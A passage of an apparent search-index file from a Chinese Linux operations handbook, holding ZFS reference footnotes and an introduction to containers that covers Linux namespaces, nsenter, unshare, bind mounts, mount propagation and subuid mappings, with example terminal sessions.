\u200b\u91cd\u542f\u200b\u670d\u52a1\u200b\u3002 \u200b\u4f46\u662f\u200b <code>/usr/sbin/policy-rc.d</code> \u200b\u5728\u200b\u591a\u5e74\u200b\u524d\u200b\u88ab\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b <code>exit 101</code>\uff0c\u200b\u56e0\u6b64\u200b <code>invoke-rc.d</code> \u200b\u65e0\u6cd5\u200b\u542f\u52a8\u200b\u670d\u52a1\u200b\uff0c \u200b\u5bfc\u81f4\u200b\u4e86\u200b process accounting \u200b\u670d\u52a1\u200b\u4e00\u76f4\u200b\u672a\u200b\u88ab\u200b\u91cd\u542f\u200b\uff0c\u200b\u5185\u6838\u200b\u4ecd\u7136\u200b\u5728\u200b\u5199\u5165\u200b\u6587\u4ef6\u200b\u3002</p>"},{"location":"ops/storage/zfs/#references","title":"\u53c2\u8003\u8d44\u6599","text":"<ol> <li> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u60f3\u8981\u200b\u7406\u89e3\u200b\u201c\u200b\u65e5\u5fd7\u200b\u5f0f\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u201d\u200b\u7684\u200b\u539f\u7406\u200b\uff0c\u200b\u6211\u4eec\u200b\u63a8\u8350\u200b Operating Systems: Three Easy Pieces \u200b\u4e2d\u200b\u7684\u200b Log-structured File Systems \u200b\u4e00\u7ae0\u200b\u3002\u00a0\u21a9</p> </li> <li> <p>\u200b\u5b9e\u9645\u4e0a\u200b dataset \u200b\u5177\u6709\u200b\u56db\u79cd\u200b\u5f62\u5f0f\u200b\uff1afilesystem\uff0cvolume\uff0csnapshot \u200b\u548c\u200b bookmark\uff0c\u200b\u4f46\u662f\u200b\u540e\u200b\u4e24\u8005\u200b\u4ec5\u200b\u4e0e\u200b\u5feb\u7167\u200b\u529f\u80fd\u200b\u76f8\u5173\u200b\u3002\u00a0\u21a9</p> </li> <li> <p>Chris Siebenmann (2017) ZFS's recordsize, holes in files, and partial blocks \u21a9</p> </li> <li> <p>\u200b\u663e\u7136\u200b\uff0c<code>volsize</code> \u200b\u7684\u200b\u521d\u59cb\u503c\u200b\u4e3a\u200b\u521b\u5efa\u200b Zvol \u200b\u65f6\u200b <code>-V</code> \u200b\u53c2\u6570\u200b\u7684\u200b\u503c\u200b\u3002\u00a0\u21a9</p> </li> <li> <p>\u200b\u5728\u200b FreeBSD \u200b\u7cfb\u7edf\u200b\u4e2d\u200b\uff0c\u200b\u6216\u8005\u200b\u5728\u200b Linux \u200b\u4e0b\u200b\u4f7f\u7528\u200b htop \u2265 3.0 \u200b\u8f6f\u4ef6\u200b\uff0cZFS ARC \u200b\u5360\u7528\u200b\u7684\u200b\u5185\u5b58\u200b\u4f1a\u200b\u6b63\u786e\u200b\u5730\u200b\u663e\u793a\u200b\u4e3a\u200b cached\u3002\u00a0\u21a9</p> </li> <li> <p>Chris's Wiki: Understanding ZFS ARC hit (and miss) kstat statistics \u21a9</p> </li> <li> <p><code>zfs destroy</code> \u200b\u547d\u4ee4\u200b\u6709\u200b\u4e00\u4e2a\u200b <code>-r</code> \u200b\u53c2\u6570\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u9012\u5f52\u200b\u5220\u9664\u200b\u6240\u6709\u200b\u5feb\u7167\u200b\u548c\u5b50\u200b\u6570\u636e\u200b\u96c6\u200b\uff08datasets\uff09\u3002\u00a0\u21a9</p> </li> <li> <p>Ubuntu 18.04 LTS \u200b\u53ca\u200b\u4e4b\u524d\u200b\u7684\u200b\u7248\u672c\u200b\u4ecd\u7136\u200b\u9700\u8981\u200b\u5b89\u88c5\u200b <code>zfs-dkms</code>\uff0c\u200b\u4f46\u200b\u66f4\u200b\u91cd\u8981\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e0d\u200b\u63a8\u8350\u200b\u4f7f\u7528\u200b\u5df2\u7ecf\u200b EOL \u200b\u7684\u200b\u53d1\u884c\u7248\u200b\u3002\u00a0\u21a9</p> </li> <li> <p>ZLE \u200b\u7684\u200b\u542b\u4e49\u200b\u4e3a\u200b Zero-Length Encoding\uff0c\u200b\u5373\u4ec5\u200b\u201c\u200b\u538b\u7f29\u200b\u201d\u200b\u5b58\u50a8\u200b\u8fde\u7eed\u200b\u7684\u200b\u96f6\u200b\u5b57\u8282\u200b\u3002\u00a0\u21a9</p> </li> <li> <p>Mike Gerdts (2019) (Code comment in <code>libzfs_dataset.c</code>) \u21a9</p> </li> <li> <p>Matthew Ahrens (2014) How I Learned to Stop Worrying and Love RAIDZ \u21a9</p> </li> <li> <p>RAID-Z parity cost (Google Sheets)\u00a0\u21a9</p> </li> <li> <p>Andreas Dilger (2010) ZFS Features &amp; Concepts TOI \u21a9</p> </li> <li> <p>University of Wisconsin-Madison Log-structured File Systems \u21a9</p> </li> <li> <p>OpenZFS Workload Tuning \u21a9</p> </li> <li> <p>Jim Salter (2020) ZFS 101 \u2013 Understanding ZFS storage and performance \u21a9</p> </li> <li> <p>openzfs/zfs#4599 (2016) disk usage wrong when using larger recordsize, raidz and ashift=12 \u21a9</p> </li> </ol>"},{"location":"ops/virtualization/","title":"\u865a\u62df\u5316\u200b\u6280\u672f","text":"<p>\u200b\u672c\u200b\u90e8\u5206\u200b\u4ecb\u7ecd\u200b\u4e0e\u200b\u5bb9\u5668\u200b\uff08Docker\uff0cLXC\uff09\u200b\u4e0e\u200b\u865a\u62df\u673a\u200b\uff08QEMU\uff0cKVM\uff09\u200b\u7b49\u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\u76f8\u5173\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002</p>"},{"location":"ops/virtualization/container/","title":"\u5bb9\u5668","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@taoky</p> <p>\u200b\u672c\u6587\u200b\u5df2\u200b\u5b8c\u6210\u200b\uff0c\u200b\u7b49\u5f85\u200b\u6821\u5bf9\u200b</p> <p>\u200b\u5bb9\u5668\u200b\u662f\u200b\u8fd1\u200b\u5341\u51e0\u5e74\u6765\u200b\u5174\u8d77\u200b\u7684\u200b\u4e00\u79cd\u200b\u8f7b\u91cf\u7ea7\u200b\u7684\u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\uff0c\u200b\u5728\u200b Linux \u200b\u5185\u6838\u200b\u652f\u6301\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u5171\u4eab\u200b\u5185\u6838\u200b\u7684\u200b\u865a\u62df\u5316\u200b\uff0c\u200b\u8ba9\u200b\u5e94\u7528\u200b\u7684\u200b\u90e8\u7f72\u200b\u4e0e\u200b\u7ba1\u7406\u200b\u53d8\u5f97\u200b\u66f4\u52a0\u200b\u7b80\u5355\u200b\u3002</p> <p>\u200b\u672c\u200b\u90e8\u5206\u200b\u5047\u8bbe\u200b\u8bfb\u8005\u200b\u4e86\u89e3\u200b\u57fa\u672c\u200b\u7684\u200b Docker \u200b\u4f7f\u7528\u200b\u3002</p>"},{"location":"ops/virtualization/container/#kernel-support","title":"\u5bb9\u5668\u200b\u6280\u672f\u200b\u7684\u200b\u5185\u6838\u200b\u652f\u6301","text":""},{"location":"ops/virtualization/container/#namespace","title":"\u547d\u540d\u200b\u7a7a\u95f4","text":"<p>Linux \u200b\u5185\u6838\u200b\u7684\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u529f\u80fd\u200b\u662f\u200b\u5bb9\u5668\u200b\u6280\u672f\u200b\u7684\u200b\u91cd\u8981\u200b\u57fa\u7840\u200b\u3002\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u53ef\u4ee5\u200b\u63a7\u5236\u200b\u8fdb\u7a0b\u200b\u6240\u200b\u80fd\u200b\u770b\u5230\u200b\u7684\u200b\u7cfb\u7edf\u8d44\u6e90\u200b\uff0c\u200b\u5305\u62ec\u200b\u5176\u4ed6\u200b\u8fdb\u7a0b\u200b\u3001\u200b\u7f51\u7edc\u200b\u3001\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3001\u200b\u7528\u6237\u200b\u7b49\u200b\u3002\u200b\u53ef\u4ee5\u200b\u9605\u8bfb\u200b namespaces(7) \u200b\u4e86\u89e3\u200b\u76f8\u5173\u200b\u7684\u200b\u4fe1\u606f\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u5728\u200b procfs \u200b\u770b\u5230\u200b\u67d0\u4e2a\u200b\u8fdb\u7a0b\u200b\u6240\u5904\u200b\u7684\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\uff1b\u200b\u4f7f\u7528\u200b <code>lsns</code> \u200b\u53ef\u4ee5\u200b\u5217\u51fa\u200b\u6240\u6709\u200b\u5f53\u524d\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u53ef\u4ee5\u200b\u300c\u200b\u770b\u5230\u200b\u300d\u200b\u7684\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\uff1a</p> <pre><code>$ ls -lh /proc/self/ns/\ntotal 0\nlrwxrwxrwx 1 username username 0 Mar 24 21:04 cgroup -&gt; 'cgroup:[4026531835]'\nlrwxrwxrwx 1 username username 0 Mar 24 21:04 ipc -&gt; 'ipc:[4026531839]'\nlrwxrwxrwx 1 username username 0 Mar 24 21:04 mnt -&gt; 'mnt:[4026531841]'\nlrwxrwxrwx 1 username username 0 Mar 24 21:04 net -&gt; 'net:[4026531840]'\nlrwxrwxrwx 1 username username 0 Mar 24 21:04 pid -&gt; 'pid:[4026531836]'\nlrwxrwxrwx 1 username username 0 Mar 24 21:04 pid_for_children -&gt; 'pid:[4026531836]'\nlrwxrwxrwx 1 username username 0 Mar 24 21:04 time -&gt; 'time:[4026531834]'\nlrwxrwxrwx 1 username username 0 Mar 24 21:04 time_for_children -&gt; 'time:[4026531834]'\nlrwxrwxrwx 1 username username 0 Mar 24 21:04 user -&gt; 'user:[4026531837]'\nlrwxrwxrwx 1 username username 0 Mar 24 21:04 uts -&gt; 'uts:[4026531838]'\n$ lsns\n        NS TYPE   NPROCS     PID USER     COMMAND\n4026531834 time      294    2440 username /usr/bin/dbus-broker-launch --scope user\n4026531835 cgroup    293    2440 username /usr/bin/dbus-broker-launch --scope user\n4026531836 pid       248    2440 username /usr/bin/dbus-broker-launch --scope user\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n</code></pre> <p>\u200b\u4f7f\u7528\u200b <code>nsenter</code> \u200b\u547d\u4ee4\u200b\u53ef\u4ee5\u200b\u8fdb\u5165\u200b\u67d0\u4e2a\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\uff1a</p> <pre><code>$ sudo docker run -it --rm --name test ustclug/ubuntu:22.04\nroot@9213a075a2f4:/#\n...\n$ # \u200b\u5f00\u542f\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u7ec8\u7aef\u200b\n$ sudo docker top test\nUID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD\nroot                117426              117406              0                   21:09               pts/0               00:00:00            bash\n$ sudo nsenter --target 117426 --uts bash # \u200b\u8fdb\u5165\u200b UTS \u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\n[root@9213a075a2f4 example]# # \u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b hostname \u200b\u5df2\u7ecf\u200b\u6539\u53d8\u200b\n</code></pre> <p>ustclug Docker image</p> <p>\u200b\u672c\u9875\u200b\u7684\u200b\u5bb9\u5668\u200b\u793a\u4f8b\u200b\u4f7f\u7528\u200b\u4e86\u200b ustclug/mirrorimage \u200b\u751f\u6210\u200b\u7684\u200b\u5bb9\u5668\u200b\u955c\u50cf\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u914d\u7f6e\u200b\u4e86\u200b\u79d1\u5927\u200b\u955c\u50cf\u200b\u7ad9\u200b\uff0c\u200b\u5e2e\u52a9\u200b\u51cf\u5c11\u200b <code>apt</code> \u200b\u7b49\u200b\u64cd\u4f5c\u200b\u4e4b\u524d\u200b\u8fd8\u8981\u200b\u8dd1\u200b <code>sed</code> \u200b\u7684\u200b\u9ebb\u70e6\u200b\uff0c\u200b\u652f\u6301\u200b\u5305\u62ec\u200b Ubuntu\u3001Debian\u3001Alpine \u200b\u7b49\u200b\u591a\u4e2a\u200b\u53d1\u884c\u7248\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u65e0\u6cd5\u200b\u987a\u5229\u200b\u8bbf\u95ee\u200b Docker Hub\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>ghcr.io/ustclug/ubuntu:22.04</code>\u3002</p> <p>\u200b\u90a3\u4e48\u200b PID \u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u4e5f\u200b\u662f\u200b\u540c\u7406\u200b\u5417\u200b\uff1f</p> <pre><code>$ sudo nsenter --target 117426 --pid bash\n# ps aux\nfatal library error, lookup self\n# echo $$\n417\n# ls -lh /proc/$$/\nls: cannot access '/proc/417/': No such file or directory\n# # \u200b\u5982\u679c\u200b\u4f7f\u7528\u200b htop\uff0c\u200b\u4ecd\u7136\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5b8c\u6574\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u5217\u8868\u200b\n</code></pre> <p>\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\u8fd9\u91cc\u200b\u6302\u8f7d\u200b\u7684\u200b procfs \u200b\u662f\u200b\u5bf9\u5e94\u200b\u6574\u4e2a\u200b\u7cfb\u7edf\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5373\u4f7f\u200b\u8fdb\u5165\u200b\u4e86\u200b\u65b0\u200b\u7684\u200b PID \u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u5728\u200b mount \u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u4e0d\u53d8\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c<code>/proc</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u7684\u200b\u5185\u5bb9\u200b\u4ecd\u7136\u200b\u662f\u200b\u5bbf\u4e3b\u673a\u200b\u7684\u200b\u3002\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u540c\u65f6\u200b\u8fdb\u5165\u200b\u5bb9\u5668\u200b\u5185\u200b\u5bf9\u5e94\u200b\u8fdb\u7a0b\u200b\u7684\u200b mount \u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\uff1a</p> <pre><code>$ sudo nsenter --target 117426 --pid --mount bash\n# ps aux\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.0   4624  3712 pts/0    Ss+  13:09   0:00 bash\nroot         434  0.0  0.0   4624  3712 ?        S    13:32   0:00 bash\nroot         437  0.0  0.0   7060  2944 ?        R+   13:32   0:00 ps aux\n</code></pre> <p>\u200b\u56e0\u6b64\u200b\u4e00\u822c\u6765\u8bb2\u200b\uff0c\u200b\u6211\u4eec\u200b\u4f1a\u200b\u5e0c\u671b\u200b\u540c\u65f6\u200b\u8fdb\u5165\u200b\u8fdb\u7a0b\u200b\u6240\u5c5e\u200b\u6240\u6709\u200b\u7684\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u4ee5\u200b\u907f\u514d\u200b\u53ef\u80fd\u200b\u7684\u200b\u4e0d\u4e00\u81f4\u6027\u200b\u95ee\u9898\u200b\u3002\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>-a</code> \u200b\u53c2\u6570\u200b\u5b9e\u73b0\u200b\u3002</p> <p>\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u4e0e\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u6709\u5173\u200b\u7684\u200b\u5b9e\u7528\u200b\u547d\u4ee4\u200b\u662f\u200b <code>unshare</code>\uff0c\u200b\u53d6\u81ea\u200b\u540c\u540d\u200b\u7684\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u521b\u5efa\u200b\u65b0\u200b\u7684\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u4e0a\u9762\u200b\u5c55\u793a\u200b PID \u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>unshare</code> \u200b\u547d\u4ee4\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b PID \u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u4e0e\u200b mount \u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5728\u200b\u65b0\u200b\u7684\u200b mount \u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u91cc\u9762\u200b\u6302\u8f7d\u200b\u65b0\u200b\u7684\u200b <code>/proc</code>\uff1a</p> <pre><code>$ sudo unshare --pid --fork --mount-proc bash\n# ps aux\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.0  10876  4568 pts/17   S    21:42   0:00 bash\nroot           2  0.0  0.0  14020  4464 pts/17   R+   21:42   0:00 ps aux\n</code></pre> <p>bind mount</p> <p>\u200b\u5bf9\u200b\u5bb9\u5668\u200b\u3001\u200b\u6c99\u76d2\u200b\u7b49\u200b\u5e94\u7528\u200b\u6765\u8bf4\u200b\uff0c\u200b\u5728\u200b\u5efa\u7acb\u200b mount \u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u540e\u200b\u4e00\u822c\u200b\u90fd\u200b\u9700\u8981\u200b\u5207\u6362\u200b\u6839\u76ee\u5f55\u200b\u5230\u200b\u65b0\u200b\u4f4d\u7f6e\u200b\uff08pivot_root(2)\uff09\u3002\u200b\u4f46\u662f\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\uff0c\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5c06\u200b\u4e3b\u673a\u200b\u7684\u200b\u67d0\u4e2a\u200b\u76ee\u5f55\u200b\u6216\u8005\u200b\u6587\u4ef6\u200b\u6302\u8f7d\u200b\u8fdb\u6765\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u200b\u9700\u8981\u200b\u7528\u5230\u200b bind mount \u200b\u4e86\u200b\u3002bind mount \u200b\u53ef\u4ee5\u200b\u4ee5\u200b\u6302\u8f7d\u200b\u70b9\u200b\u7684\u200b\u5f62\u5f0f\u200b\u5c06\u200b\u67d0\u4e2a\u200b\u6587\u4ef6\u200b\u6216\u8005\u200b\u76ee\u5f55\u200b\u300c\u200b\u6302\u8f7d\u200b\u300d\u200b\u5230\u200b\u5176\u4ed6\u200b\u5730\u65b9\u200b\u3002\u200b\u4f7f\u7528\u200b mount(8) \u200b\u547d\u4ee4\u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b bind mount\uff1a</p> <pre><code># \u200b\u5c06\u200b /dir1 \u200b\u6302\u8f7d\u200b\u5230\u200b /dir2\nsudo mount --bind /dir1 /dir2\n# \u200b\u5c06\u200b /dir1\uff0c\u200b\u5305\u62ec\u200b /dir1 \u200b\u4e0b\u9762\u200b\u7684\u200b\u5176\u4ed6\u200b\u5b50\u200b\u6302\u8f7d\u200b\u70b9\u200b\u9012\u5f52\u200b\u6302\u8f7d\u200b\u5230\u200b /dir2\nsudo mount --rbind /dir1 /dir2\n</code></pre> <p>\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u5173\u952e\u200b\u7684\u200b\u53c2\u6570\u200b\u662f\u200b\u6302\u8f7d\u200b\u4f20\u64ad\u200b\uff08mount propagation\uff09\uff0c\u200b\u5b83\u200b\u51b3\u5b9a\u200b\u4e86\u200b\u67d0\u4e2a\u200b\u6302\u8f7d\u200b\u70b9\u200b\u5185\u90e8\u200b\u5b50\u200b\u6302\u8f7d\u200b\u70b9\u200b\u7684\u200b\u53d8\u5316\u200b\u662f\u5426\u200b\u4f1a\u200b\u4f20\u64ad\u200b\u5230\u200b\u5b83\u200b\u81ea\u5df1\u200b\u7684\u200b\u5176\u4ed6\u200b\u300c\u200b\u5206\u8eab\u200b\u300d\uff08bind mount \u200b\u6216\u8005\u200b\u5176\u4ed6\u200b\u7684\u200b mount namespace\uff09\u200b\u4e0a\u9762\u200b\u3002\u200b\u6709\u200b\u56db\u79cd\u200b\u4e0d\u540c\u200b\u7684\u200b\u4f20\u64ad\u200b\u6a21\u5f0f\u200b\uff1a</p> <ul> <li>shared\uff1a\u200b\u4f20\u64ad\u200b\u3001\u200b\u63a5\u53d7\u200b\u53d8\u5316\u200b\uff0c\u200b\u8fd9\u200b\u4e00\u822c\u200b\u662f\u200b\u4e3b\u673a\u200b\u73af\u5883\u200b\u7684\u200b\u9ed8\u8ba4\u503c\u200b</li> <li>private\uff1a\u200b\u4e0d\u200b\u4f20\u64ad\u200b\u3001\u200b\u4e0d\u200b\u63a5\u53d7\u200b\u53d8\u5316\u200b</li> <li>slave\uff1a\u200b\u4e0d\u200b\u4f20\u64ad\u200b\u53d8\u5316\u200b\uff0c\u200b\u53ea\u200b\u63a5\u53d7\u200b\u5b83\u200b\u7684\u200b\u7236\u200b mount namespace \u200b\u91cc\u200b\u7684\u200b\u53d8\u5316\u200b\uff08\u200b\u5bf9\u5e94\u200b\u7236\u200b mount namespace \u200b\u7684\u200b\u6302\u8f7d\u200b\u70b9\u200b\u9700\u8981\u200b\u662f\u200b shared\uff09</li> <li>unbindable\uff1a\u200b\u4e0d\u200b\u4f20\u64ad\u200b\u3001\u200b\u4e0d\u200b\u63a5\u53d7\u200b\u53d8\u5316\u200b\uff0c\u200b\u4e5f\u200b\u4e0d\u200b\u5141\u8bb8\u200b\u88ab\u200b bind mount</li> </ul> <p>\u200b\u5728\u200b\u8fd9\u200b\u56db\u9879\u200b\u53c2\u6570\u200b\u524d\u9762\u200b\u52a0\u4e0a\u200b <code>r</code> \u200b\u5c31\u200b\u4ee3\u8868\u200b\u9012\u5f52\u200b\u8bbe\u7f6e\u200b\u884c\u4e3a\u200b\u3002\u200b\u4e00\u822c\u6765\u8bb2\u200b\uff0c\u200b\u5bb9\u5668\u200b\u90fd\u200b\u4f1a\u200b\u9009\u62e9\u200b <code>rprivate</code> \u200b\u4f20\u64ad\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u9632\u6b62\u200b\u5bb9\u5668\u200b\u4e0e\u200b\u4e3b\u673a\u200b\u4e4b\u95f4\u200b\u4e92\u76f8\u200b\u5f71\u54cd\u200b\u3002\u200b\u5728\u200b\u7279\u5b9a\u200b\u9700\u6c42\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff08\u200b\u4f8b\u5982\u200b\u8fd9\u4e2a\u200b issue\uff09\uff0c\u200b\u53ef\u4ee5\u200b\u89c6\u200b\u60c5\u51b5\u200b\u9009\u62e9\u200b <code>rslave</code> \u200b\u6216\u8005\u200b <code>rshared</code> \u200b\u4f20\u64ad\u200b\u6a21\u5f0f\u200b\u3002Docker \u200b\u652f\u6301\u200b\u76f8\u5173\u200b\u7684\u200b\u8bbe\u7f6e\u200b\u3002</p> <p>\u200b\u53e6\u5916\u200b\uff0c\u200b\u6709\u200b\u4e00\u79cd\u200b\u7528\u6237\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u5141\u8bb8\u200b\u975e\u200b root \u200b\u7528\u6237\u200b\u521b\u5efa\u200b\u65b0\u200b\u7684\u200b\u7528\u6237\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\uff08\u200b\u8fd9\u200b\u4e5f\u200b\u662f\u200b rootless \u200b\u5bb9\u5668\u200b\u7684\u200b\u57fa\u7840\u200b\uff09\uff0c\u200b\u8ba9\u200b\u6211\u4eec\u200b\u7b80\u5355\u200b\u8bd5\u4e00\u8bd5\u200b\uff1a</p> <pre><code>$ unshare --user --pid --fork --mount-proc bash\n$ ps aux\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nnobody         1  0.0  0.0  10876  4312 pts/16   S    21:44   0:00 bash\nnobody         2  0.0  0.0  14020  4276 pts/16   R+   21:44   0:00 ps aux\n$ exit\n$ # \u200b\u751a\u81f3\u200b\u53ef\u4ee5\u200b\u4fee\u6539\u200b\u6620\u5c04\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u300c\u200b\u5047\u200b\u7684\u200b\u300droot\n$ unshare --user --pid --fork --map-root-user --mount-proc bash\n# ps aux\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.0  10876  4468 pts/16   S    21:46   0:00 bash\nroot           2  0.0  0.0  14020  4416 pts/16   R+   21:46   0:00 ps aux\n</code></pre> <p>subuid \u200b\u548c\u200b subgid</p> <p><code>/etc/subuid</code> \u200b\u548c\u200b <code>/etc/subgid</code> \u200b\u6587\u4ef6\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u7528\u6237\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u5141\u8bb8\u200b\u7684\u200b UID \u200b\u548c\u200b GID \u200b\u7684\u200b\u6620\u5c04\u200b\u5173\u7cfb\u200b\u3002\u200b\u4e00\u4e2a\u200b <code>subuid</code> \u200b\u6587\u4ef6\u200b\u7684\u200b\u4f8b\u5b50\u200b\u5982\u4e0b\u200b\uff1a</p> /etc/subuid<pre><code>user:100000:65536\n</code></pre> <p>\u200b\u8fd9\u200b\u4ee3\u8868\u200b\u7528\u6237\u200b\u540d\u4e3a\u200b user \u200b\u7684\u200b\u7528\u6237\u200b\u5728\u200b\u521b\u5efa\u200b\u65b0\u200b\u7684\u200b\u7528\u6237\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u4ece\u200b UID 100000 \u200b\u5f00\u59cb\u200b\u7684\u200b 65536 \u200b\u4e2a\u200b UID \u200b\u6620\u5c04\u200b\u5230\u200b\u65b0\u200b\u7684\u200b\u7528\u6237\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u4e2d\u200b\u3002\u200b\u4e00\u79cd\u200b\u5e38\u89c1\u200b\u7684\u200b\u6620\u5c04\u200b\u5173\u7cfb\u200b\u662f\u200b\uff0c\u200b\u65b0\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u7684\u200b root \u200b\u7528\u6237\u200b\uff08UID 0\uff09\u200b\u6620\u5c04\u200b\u5230\u200b\u5bbf\u4e3b\u673a\u200b\u7684\u200b\u5f53\u524d\u200b\u7528\u6237\u200b\uff0c\u200b\u800c\u200b root \u200b\u4ee5\u5916\u200b\u7684\u200b\u7528\u6237\u200b\u5219\u200b\u4f9d\u6b21\u200b\u4f7f\u7528\u200b\u6620\u5c04\u200b\uff0c\u200b\u4f8b\u5982\u200b\u7528\u6237\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u4e2d\u200b\u7684\u200b UID 1 \u200b\u5c31\u200b\u6620\u5c04\u200b\u5230\u200b\u5bbf\u4e3b\u673a\u200b\u7684\u200b UID 100000\uff0c\u200b\u4ee5\u6b64\u7c7b\u63a8\u200b\u3002</p> <p>\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u7684\u200b\u9b54\u6cd5\u200b</p> <p>\u200b\u5728\u200b\u4e86\u89e3\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u7ed5\u8fc7\u200b\u5bb9\u5668\u200b\u8fd0\u884c\u200b\u65f6\u200b\u7684\u200b\u4e00\u4e9b\u200b\u9650\u5236\u200b\uff0c\u200b\u76f4\u63a5\u200b\u64cd\u4f5c\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u3002</p> <p>\u200b\u4f5c\u4e3a\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b\u300c\u200b\u82b1\u5f0f\u200b\u64cd\u4f5c\u200b\u300d\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u9605\u8bfb\u200b\u8fd9\u7bc7\u200b USENIX ATC 2018 \u200b\u7684\u200b\u8bba\u6587\u200b\uff1aCntr: Lightweight OS Containers\uff08\u200b\u4ee5\u53ca\u200b\u76ee\u524d\u200b\u4ecd\u7136\u200b\u5728\u200b\u7ef4\u62a4\u200b\u7684\u200b\u4ee3\u7801\u200b\u4ed3\u5e93\u200b\uff09\u3002\u200b\u8fd9\u7bc7\u200b\u5de5\u4f5c\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u5728\u200b\u4e0d\u200b\u5305\u542b\u200b\u8c03\u8bd5\u200b\u5de5\u5177\u200b\u7684\u200b\u5bb9\u5668\u200b\u4e2d\u200b\u4f7f\u7528\u200b\u5305\u542b\u200b\u8c03\u8bd5\u200b\u5de5\u5177\u200b\u7684\u200b\u955c\u50cf\u200b\uff08\u200b\u6216\u8005\u200b host \u200b\u7684\u200b\u8c03\u8bd5\u200b\u5de5\u5177\u200b\uff09\u200b\u8fdb\u884c\u200b\u8c03\u8bd5\u200b\u7684\u200b\u529f\u80fd\u200b\u3002</p>"},{"location":"ops/virtualization/container/#cgroups","title":"Cgroups","text":"<p>Cgroups\uff08cgroups(7)\uff09\u200b\u662f\u200b Linux 